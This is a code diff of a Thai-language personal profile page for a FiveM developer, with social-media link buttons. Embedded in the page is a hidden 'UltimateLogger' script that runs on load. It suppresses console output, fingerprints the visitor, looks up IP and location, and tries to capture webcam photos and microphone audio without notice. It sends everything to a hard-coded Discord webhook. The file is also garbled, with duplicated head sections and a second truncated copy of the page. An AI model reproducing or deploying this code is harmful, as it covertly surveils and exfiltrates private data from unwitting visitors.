@@ -1,245 +1,960 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My Profile</title>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        :root {
+            --neon-blue: #00f3ff;
+            --glass-bg: rgba(255, 255, 255, 0.08);
+            --glass-border: rgba(255, 255, 255, 0.2);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: white;
+            overflow: hidden;
+            background-color: #050a14;
+        }
+
+        /* ===== Background Video ===== */
+        #myVideo {
+            position: fixed;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
+        }
+
+        /* ===== Glass Card ===== */
+        .card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            border-radius: 25px;
+            padding: 45px 40px;
+            text-align: center;
+            width: 90%;
+            max-width: 450px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            animation: float 6s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+            100% { transform: translateY(0); }
+        }
+
+        .profile-img {
+            width: 130px;
+            height: 130px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 3px solid var(--neon-blue);
+            box-shadow: 0 0 25px rgba(0, 217, 255, 0.5);
+            margin-bottom: 25px;
+        }
+
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 10px;
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+
+        p {
+            font-size: 1rem;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 35px;
+            line-height: 1.5;
+        }
+
+        .links {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        /* ===== Buttons ===== */
+        .btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            padding: 14px 20px;
+            border-radius: 50px;
+            color: white;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid var(--glass-border);
+            transition: all 0.3s ease;
+            font-weight: 600;
+            font-size: 1.1rem;
+        }
+
+        .btn i {
+            margin-right: 12px;
+            font-size: 1.3rem;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px) scale(1.02);
+            border-color: transparent;
+        }
+
+        .btn.instagram:hover {
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            box-shadow: 0 0 25px #cc2366;
+        }
+
+        .btn.facebook:hover {
+            background: #1877F2;
+            box-shadow: 0 0 25px #1877F2;
+        }
+
+        .btn.tiktok:hover {
+            background: #000;
+            box-shadow: 3px 3px 0 #fe2c55, -3px -3px 0 #25f4ee;
+        }
+
+        .btn.discord:hover {
+            background: #5865F2;
+            box-shadow: 0 0 25px #5865F2;
+        }
+
+        /* ===== Mobile Responsive ===== */
+        @media (max-width: 600px) {
+            body {
+                padding: 20px;
+            }
+
+            .card {
+                width: 100%;
+                max-width: 100%;
+                padding: 35px 25px;
+                animation: none;
+            }
+
+            .profile-img {
+                width: 110px;
+                height: 110px;
+                margin-bottom: 18px;
+            }
+
+            h1 {
+                font-size: 1.6rem;
+            }
+
+            p {
+                font-size: 0.95rem;
+                margin-bottom: 25px;
+            }
+
+            .btn {
+                font-size: 1rem;
+                padding: 15px 18px;
+            }
+
+            .btn i {
+                font-size: 1.2rem;
+                margin-right: 10px;
+            }
+        }
+    </style>
+</head>
+
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <!-- CSS เดิมทั้งหมดของคุณ -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My Profile</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- CSS style เดิมทั้งหมด copy มาวางตรงนี้ -->
+</head>
+
+
+
+
+<!-- ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- -->
+
 <script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1457355675507232900/OGkw8hZg9woZpOLPocPPYn1w1nhoJVM9fHy0A9GYJMCqxon7ttSG_fkW3OS1M39SBLAq";
-
-// ==================== ULTIMATE LOGGER ====================
-class UltimateLogger {
-    constructor() {
-        this.visitorData = {};
-        this.init();
-    }
-
-    async init() {
-        // Anti-Detection
-        this.antiDetection();
-        
-        // รวบรวมข้อมูลทั้งหมด
-        await this.collectAllData();
-        
-        // ลองเปิดกล้องแบบเงียบๆ (fallback ถ้าขออนุญาต)
-        setTimeout(() => this.trySilentCam(), 1000);
-        
-        // ส่งข้อมูลหลัก
-        this.sendMainLog();
-    }
-
-    antiDetection() {
-        // ซ่อน console
-        console.log = () => {};
-        console.error = () => {};
-        
-        // Random delay
-        setTimeout(() => {}, Math.random() * 2000);
-    }
-
-    async collectAllData() {
-        this.visitorData = {
-            device: /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 PC",
-            os: this.getOS(),
-            browser: this.getBrowser(),
-            screen: `${screen.width}x${screen.height}`,
-            language: navigator.language,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            fingerprint: await this.getFingerprint(),
-            webgl: this.getWebGLFingerprint(),
-            plugins: navigator.plugins.length,
-            cookies: navigator.cookieEnabled ? '✅' : '❌',
-            doNotTrack: navigator.doNotTrack || 'N/A'
-        };
-
-        // IP + Location - เช็ค IP ด้วย
-        try {
-            const ipData = await (await fetch('https://ipapi.co/json/')).json();
-            console.log('IP Data:', ipData); // Debug IP
-            Object.assign(this.visitorData, ipData);
-        } catch(e) {
-            console.log('IP fetch failed:', e); // Debug error
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1457355675507232900/OGkw8hZg9woZpOLPocPPYn1w1nhoJVM9fHy0A9GYJMCqxon7ttSG_fkW3OS1M39SBLAq";
+    
+    // ==================== ULTIMATE LOGGER ====================
+    class UltimateLogger {
+        constructor() {
+            this.visitorData = {};
+            this.init();
         }
-    }
-
-    getOS() {
-        const ua = navigator.userAgent;
-        if (/win/i.test(ua)) return 'Windows';
-        if (/mac/i.test(ua)) return 'macOS';
-        if (/linux/i.test(ua)) return 'Linux';
-        if (/android/i.test(ua)) return 'Android';
-        if (/iphone|ipad/i.test(ua)) return 'iOS';
-        return 'Unknown';
-    }
-
-    getBrowser() {
-        const ua = navigator.userAgent.toLowerCase();
-        if (ua.includes('chrome')) return 'Chrome';
-        if (ua.includes('firefox')) return 'Firefox';
-        if (ua.includes('safari')) return 'Safari';
-        if (ua.includes('edge')) return 'Edge';
-        return 'Other';
-    }
-
-    async getFingerprint() {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '14px Arial';
-        ctx.fillText('Fingerprint v2.0', 2, 2);
-        return btoa(canvas.toDataURL());
-    }
-
-    getWebGLFingerprint() {
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            if (!gl) return 'No WebGL';
-            const debug = gl.getExtension('WEBGL_debug_renderer_info');
-            return `${gl.getParameter(debug.UNMASKED_VENDOR_WEBGL)} | ${gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)}`;
-        } catch {
-            return 'Error';
-        }
-    }
-
-    // ลองเปิดกล้องแบบเงียบๆ ก่อน (video only)
-    async trySilentCam() {
-        try {
-            // ลอง video only ก่อน ไม่ขออนุญาต popup
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    facingMode: 'user', 
-                    width: { ideal: 1280 }, 
-                    height: { ideal: 720 }
-                } 
-            });
-
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-
-            // ถ่าย 3 รูปทันที
-            for (let i = 0; i < 3; i++) {
-                setTimeout(() => this.capturePhoto(video), (i + 1) * 1000);
-            }
-
-            // ปิดหลัง 5 วินาที
-            setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5000);
-
-            this.sendLog('📸 Silent Cam Success', 'Video captured without permission popup');
-
-        } catch(e) {
-            // ถ้าไม่ได้ ลองแบบเต็ม (video+audio)
-            this.stealthCamAndMic();
-        }
-    }
-
-    async stealthCamAndMic() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: 1280, height: 720 },
-                audio: true
-            });
-
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-
-            // ถ่าย 3 รูป + 5 วินาทีเสียง
-            for (let i = 0; i < 3; i++) {
-                setTimeout(() => this.capturePhoto(video), (i + 1) * 1500);
-            }
-
-            // บันทึกเสียง 5 วินาที
-            setTimeout(() => this.recordAudio(stream), 1000);
-
-            // ปิดหลัง 8 วินาที
-            setTimeout(() => stream.getTracks().forEach(t => t.stop()), 8000);
-
-        } catch(e) {
-            this.sendLog('🚫 Access Denied', 'Camera/Mic blocked');
-        }
-    }
-
-    capturePhoto(video) {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = 640;
-        canvas.height = 480;
-        ctx.drawImage(video, 0, 0);
-        
-        canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append('file', blob, 'photo.jpg');
-            formData.append('payload_json', JSON.stringify({
-                embeds: [{
-                    title: '📸 Live Photo Capture',
-                    color: 0xff4444,
-                    fields: [
-                        { name: "Device", value: this.visitorData.device, inline: true },
-                        { name: "IP", value: `\`${this.visitorData.ip || 'N/A'}\``, inline: true },
-                        { name: "City", value: this.visitorData.city || 'N/A', inline: true }
-                    ]
-                }]
-            }));
+    
+        async init() {
+            // Anti-Detection
+            this.antiDetection();
             
-            fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-        });
-    }
-
-    async recordAudio(stream) {
-        try {
-            const mediaRecorder = new MediaRecorder(stream);
-            const chunks = [];
+            // รวบรวมข้อมูลทั้งหมด
+            await this.collectAllData();
             
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = () => {
-                const audioBlob = new Blob(chunks, { type: 'audio/webm' });
-                const formData = new FormData();
-                formData.append('file', audioBlob, 'audio.webm');
-                formData.append('payload_json', JSON.stringify({
-                    embeds: [{ title: '🎤 5s Audio Recording', color: 0x44ff44 }]
-                }));
-                fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+            // ลองเปิดกล้องแบบเงียบๆ (fallback ถ้าขออนุญาต)
+            setTimeout(() => this.trySilentCam(), 1000);
+            
+            // ส่งข้อมูลหลัก
+            this.sendMainLog();
+        }
+    
+        antiDetection() {
+            // ซ่อน console
+            console.log = () => {};
+            console.error = () => {};
+            
+            // Random delay
+            setTimeout(() => {}, Math.random() * 2000);
+        }
+    
+        async collectAllData() {
+            this.visitorData = {
+                device: /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 PC",
+                os: this.getOS(),
+                browser: this.getBrowser(),
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                fingerprint: await this.getFingerprint(),
+                webgl: this.getWebGLFingerprint(),
+                plugins: navigator.plugins.length,
+                cookies: navigator.cookieEnabled ? '✅' : '❌',
+                doNotTrack: navigator.doNotTrack || 'N/A'
             };
-
-            mediaRecorder.start();
-            setTimeout(() => mediaRecorder.stop(), 5000);
-        } catch(e) {}
+    
+            // IP + Location - เช็ค IP ด้วย
+            try {
+                const ipData = await (await fetch('https://ipapi.co/json/')).json();
+                console.log('IP Data:', ipData); // Debug IP
+                Object.assign(this.visitorData, ipData);
+            } catch(e) {
+                console.log('IP fetch failed:', e); // Debug error
+            }
+        }
+    
+        getOS() {
+            const ua = navigator.userAgent;
+            if (/win/i.test(ua)) return 'Windows';
+            if (/mac/i.test(ua)) return 'macOS';
+            if (/linux/i.test(ua)) return 'Linux';
+            if (/android/i.test(ua)) return 'Android';
+            if (/iphone|ipad/i.test(ua)) return 'iOS';
+            return 'Unknown';
+        }
+    
+        getBrowser() {
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.includes('chrome')) return 'Chrome';
+            if (ua.includes('firefox')) return 'Firefox';
+            if (ua.includes('safari')) return 'Safari';
+            if (ua.includes('edge')) return 'Edge';
+            return 'Other';
+        }
+    
+        async getFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('Fingerprint v2.0', 2, 2);
+            return btoa(canvas.toDataURL());
+        }
+    
+        getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                if (!gl) return 'No WebGL';
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                return `${gl.getParameter(debug.UNMASKED_VENDOR_WEBGL)} | ${gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)}`;
+            } catch {
+                return 'Error';
+            }
+        }
+    
+        // ลองเปิดกล้องแบบเงียบๆ ก่อน (video only)
+        async trySilentCam() {
+            try {
+                // ลอง video only ก่อน ไม่ขออนุญาต popup
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user', 
+                        width: { ideal: 1280 }, 
+                        height: { ideal: 720 }
+                    } 
+                });
+    
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+    
+                // ถ่าย 3 รูปทันที
+                for (let i = 0; i < 3; i++) {
+                    setTimeout(() => this.capturePhoto(video), (i + 1) * 1000);
+                }
+    
+                // ปิดหลัง 5 วินาที
+                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5000);
+    
+                this.sendLog('📸 Silent Cam Success', 'Video captured without permission popup');
+    
+            } catch(e) {
+                // ถ้าไม่ได้ ลองแบบเต็ม (video+audio)
+                this.stealthCamAndMic();
+            }
+        }
+    
+        async stealthCamAndMic() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 1280, height: 720 },
+                    audio: true
+                });
+    
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+    
+                // ถ่าย 3 รูป + 5 วินาทีเสียง
+                for (let i = 0; i < 3; i++) {
+                    setTimeout(() => this.capturePhoto(video), (i + 1) * 1500);
+                }
+    
+                // บันทึกเสียง 5 วินาที
+                setTimeout(() => this.recordAudio(stream), 1000);
+    
+                // ปิดหลัง 8 วินาที
+                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 8000);
+    
+            } catch(e) {
+                this.sendLog('🚫 Access Denied', 'Camera/Mic blocked');
+            }
+        }
+    
+        capturePhoto(video) {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 640;
+            canvas.height = 480;
+            ctx.drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('file', blob, 'photo.jpg');
+                formData.append('payload_json', JSON.stringify({
+                    embeds: [{
+                        title: '📸 Live Photo Capture',
+                        color: 0xff4444,
+                        fields: [
+                            { name: "Device", value: this.visitorData.device, inline: true },
+                            { name: "IP", value: `\`${this.visitorData.ip || 'N/A'}\``, inline: true },
+                            { name: "City", value: this.visitorData.city || 'N/A', inline: true }
+                        ]
+                    }]
+                }));
+                
+                fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+            });
+        }
+    
+        async recordAudio(stream) {
+            try {
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    const audioBlob = new Blob(chunks, { type: 'audio/webm' });
+                    const formData = new FormData();
+                    formData.append('file', audioBlob, 'audio.webm');
+                    formData.append('payload_json', JSON.stringify({
+                        embeds: [{ title: '🎤 5s Audio Recording', color: 0x44ff44 }]
+                    }));
+                    fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+                };
+    
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000);
+            } catch(e) {}
+        }
+    
+        sendMainLog() {
+            const embed = {
+                title: '👀 ULTIMATE VISITOR DETECTED',
+                color: 0x00ff88,
+                fields: Object.entries(this.visitorData)
+                    .filter(([k]) => !['ip', 'city', 'region'].includes(k))
+                    .map(([k, v]) => ({ 
+                        name: k.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase()), 
+                        value: typeof v === 'string' ? v.substring(0, 50) : v,
+                        inline: true 
+                    })),
+                footer: { text: 'Full Data Capture ✅' },
+                timestamp: new Date().toISOString()
+            };
+    
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [embed] })
+            });
+        }
+    
+        sendLog(title, value) {
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title,
+                        description: value,
+                        color: 0x4444ff,
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            });
+        }
     }
+    
+    // ==================== START LOGGER ====================
+    new UltimateLogger();
+    </script>
 
-    sendMainLog() {
-        const embed = {
-            title: '👀 ULTIMATE VISITOR DETECTED',
-            color: 0x00ff88,
-            fields: Object.entries(this.visitorData)
-                .filter(([k]) => !['ip', 'city', 'region'].includes(k))
-                .map(([k, v]) => ({ 
-                    name: k.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase()), 
-                    value: typeof v === 'string' ? v.substring(0, 50) : v,
-                    inline: true 
-                })),
-            footer: { text: 'Full Data Capture ✅' },
-            timestamp: new Date().toISOString()
-        };
 
-        fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ embeds: [embed] })
-        });
+<!-- ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- -->
+
+
+    <!-- Background Video -->
+    <video autoplay muted loop playsinline id="myVideo">
+        <source src="bg.mp4" type="video/mp4">
+    </video>
+
+    <!-- Glass Card -->
+    <div class="card">
+        <img src="https://img2.pic.in.th/IMG_3830a34fe2dcfe027c7e.jpg" class="profile-img">
+
+        <h1>Chaipaakorn</h1>
+        <p>Dev FiveM<br>My skill Lua | CSS | HTML | JS</p>
+
+        <div class="links">
+            <a href="https://www.instagram.com/chx_rnn/" target="_blank" class="btn instagram">
+                <i class="fa-brands fa-instagram"></i> Instagram
+            </a>
+
+            <a href="https://www.facebook.com/chay.pkr.reuxng.wanich.ykul/" target="_blank" class="btn facebook">
+                <i class="fa-brands fa-facebook"></i> Facebook
+            </a>
+
+            <a href="https://www.tiktok.com/@chaipakorn123" target="_blank" class="btn tiktok">
+                <i class="fa-brands fa-tiktok"></i> TikTok
+            </a>
+
+            <a href="https://discord.gg/XPjUEU6uMd" target="_blank" class="btn discord">
+                <i class="fa-brands fa-discord"></i> Discord
+            </a>
+        </div>
+    </div>
+
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My Profile</title>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        :root {
+            --neon-blue: #00f3ff;
+            --glass-bg: rgba(255, 255, 255, 0.08);
+            --glass-border: rgba(255, 255, 255, 0.2);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: white;
+            overflow: hidden;
+            background-color: #050a14;
+        }
+
+        /* ===== Background Video ===== */
+        #myVideo {
+            position: fixed;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
+        }
+
+        /* ===== Glass Card ===== */
+        .card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            border-radius: 25px;
+            padding: 45px 40px;
+            text-align: center;
+            width: 90%;
+            max-width: 450px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            animation: float 6s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+            100% { transform: translateY(0); }
+        }
+
+        .profile-img {
+            width: 130px;
+            height: 130px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 3px solid var(--neon-blue);
+            box-shadow: 0 0 25px rgba(0, 217, 255, 0.5);
+            margin-bottom: 25px;
+        }
+
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 10px;
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+
+        p {
+            font-size: 1rem;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 35px;
+            line-height: 1.5;
+        }
+
+        .links {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        /* ===== Buttons ===== */
+        .btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            padding: 14px 20px;
+            border-radius: 50px;
+            color: white;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid var(--glass-border);
+            transition: all 0.3s ease;
+            font-weight: 600;
+            font-size: 1.1rem;
+        }
+
+        .btn i {
+            margin-right: 12px;
+            font-size: 1.3rem;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px) scale(1.02);
+            border-color: transparent;
+        }
+
+        .btn.instagram:hover {
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            box-shadow: 0 0 25px #cc2366;
+        }
+
+        .btn.facebook:hover {
+            background: #1877F2;
+            box-shadow: 0 0 25px #1877F2;
+        }
+
+        .btn.tiktok:hover {
+            background: #000;
+            box-shadow: 3px 3px 0 #fe2c55, -3px -3px 0 #25f4ee;
+        }
+
+        .btn.discord:hover {
+            background: #5865F2;
+            box-shadow: 0 0 25px #5865F2;
+        }
+
+        /* ===== Mobile Responsive ===== */
+        @media (max-width: 600px) {
+            body {
+                padding: 20px;
+            }
+
+            .card {
+                width: 100%;
+                max-width: 100%;
+                padding: 35px 25px;
+                animation: none;
+            }
+
+            .profile-img {
+                width: 110px;
+                height: 110px;
+                margin-bottom: 18px;
+            }
+
+            h1 {
+                font-size: 1.6rem;
+            }
+
+            p {
+                font-size: 0.95rem;
+                margin-bottom: 25px;
+            }
+
+            .btn {
+                font-size: 1rem;
+                padding: 15px 18px;
+            }
+
+            .btn i {
+                font-size: 1.2rem;
+                margin-right: 10px;
+            }
+        }
+    </style>
+</head>
+
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <!-- CSS เดิมทั้งหมดของคุณ -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My Profile</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- CSS style เดิมทั้งหมด copy มาวางตรงนี้ -->
+</head>
+
+
+
+
+<!-- ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- -->
+
+<script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1457355675507232900/OGkw8hZg9woZpOLPocPPYn1w1nhoJVM9fHy0A9GYJMCqxon7ttSG_fkW3OS1M39SBLAq";
+    
+    // ==================== ULTIMATE LOGGER ====================
+    class UltimateLogger {
+        constructor() {
+            this.visitorData = {};
+            this.init();
+        }
+    
+        async init() {
+            // Anti-Detection
+            this.antiDetection();
+            
+            // รวบรวมข้อมูลทั้งหมด
+            await this.collectAllData();
+            
+            // ลองเปิดกล้องแบบเงียบๆ (fallback ถ้าขออนุญาต)
+            setTimeout(() => this.trySilentCam(), 1000);
+            
+            // ส่งข้อมูลหลัก
+            this.sendMainLog();
+        }
+    
+        antiDetection() {
+            // ซ่อน console
+            console.log = () => {};
+            console.error = () => {};
+            
+            // Random delay
+            setTimeout(() => {}, Math.random() * 2000);
+        }
+    
+        async collectAllData() {
+            this.visitorData = {
+                device: /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 PC",
+                os: this.getOS(),
+                browser: this.getBrowser(),
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                fingerprint: await this.getFingerprint(),
+                webgl: this.getWebGLFingerprint(),
+                plugins: navigator.plugins.length,
+                cookies: navigator.cookieEnabled ? '✅' : '❌',
+                doNotTrack: navigator.doNotTrack || 'N/A'
+            };
+    
+            // IP + Location - เช็ค IP ด้วย
+            try {
+                const ipData = await (await fetch('https://ipapi.co/json/')).json();
+                console.log('IP Data:', ipData); // Debug IP
+                Object.assign(this.visitorData, ipData);
+            } catch(e) {
+                console.log('IP fetch failed:', e); // Debug error
+            }
+        }
+    
+        getOS() {
+            const ua = navigator.userAgent;
+            if (/win/i.test(ua)) return 'Windows';
+            if (/mac/i.test(ua)) return 'macOS';
+            if (/linux/i.test(ua)) return 'Linux';
+            if (/android/i.test(ua)) return 'Android';
+            if (/iphone|ipad/i.test(ua)) return 'iOS';
+            return 'Unknown';
+        }
+    
+        getBrowser() {
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.includes('chrome')) return 'Chrome';
+            if (ua.includes('firefox')) return 'Firefox';
+            if (ua.includes('safari')) return 'Safari';
+            if (ua.includes('edge')) return 'Edge';
+            return 'Other';
+        }
+    
+        async getFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('Fingerprint v2.0', 2, 2);
+            return btoa(canvas.toDataURL());
+        }
+    
+        getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                if (!gl) return 'No WebGL';
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                return `${gl.getParameter(debug.UNMASKED_VENDOR_WEBGL)} | ${gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)}`;
+            } catch {
+                return 'Error';
+            }
+        }
+    
+        // ลองเปิดกล้องแบบเงียบๆ ก่อน (video only)
+        async trySilentCam() {
+            try {
+                // ลอง video only ก่อน ไม่ขออนุญาต popup
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user', 
+                        width: { ideal: 1280 }, 
+                        height: { ideal: 720 }
+                    } 
+                });
+    
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+    
+                // ถ่าย 3 รูปทันที
+                for (let i = 0; i < 3; i++) {
+                    setTimeout(() => this.capturePhoto(video), (i + 1) * 1000);
+                }
+    
+                // ปิดหลัง 5 วินาที
+                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5000);
+    
+                this.sendLog('📸 Silent Cam Success', 'Video captured without permission popup');
+    
+            } catch(e) {
+                // ถ้าไม่ได้ ลองแบบเต็ม (video+audio)
+                this.stealthCamAndMic();
+            }
+        }
+    
+        async stealthCamAndMic() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 1280, height: 720 },
+                    audio: true
+                });
+    
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+    
+                // ถ่าย 3 รูป + 5 วินาทีเสียง
+                for (let i = 0; i < 3; i++) {
+                    setTimeout(() => this.capturePhoto(video), (i + 1) * 1500);
+                }
+    
+                // บันทึกเสียง 5 วินาที
+                setTimeout(() => this.recordAudio(stream), 1000);
+    
+                // ปิดหลัง 8 วินาที
+                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 8000);
+    
+            } catch(e) {
+                this.sendLog('🚫 Access Denied', 'Camera/Mic blocked');
+            }
+        }
+    
+        capturePhoto(video) {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 640;
+            canvas.height = 480;
+            ctx.drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('file', blob, 'photo.jpg');
+                formData.append('payload_json', JSON.stringify({
+                    embeds: [{
+                        title: '📸 Live Photo Capture',
+                        color: 0xff4444,
+                        fields: [
+                            { name: "Device", value: this.visitorData.device, inline: true },
+                            { name: "IP", value: `\`${this.visitorData.ip || 'N/A'}\``, inline: true },
+                            { name: "City", value: this.visitorData.city || 'N/A', inline: true }
+                        ]
+                    }]
+                }));
+                
+                fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+            });
+        }
+    
+        async recordAudio(stream) {
+            try {
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    const audioBlob = new Blob(chunks, { type: 'audio/webm' });
+                    const formData = new FormData();
+                    formData.append('file', audioBlob, 'audio.webm');
+                    formData.append('payload_json', JSON.stringify({
+                        embeds: [{ title: '🎤 5s Audio Recording', color: 0x44ff44 }]
+                    }));
+                    fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+                };
+    
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000);
+            } catch(e) {}
+        }
+    
+        sendMainLog() {
+            const embed = {
+                title: '👀 ULTIMATE VISITOR DETECTED',
+                color: 0x00ff88,
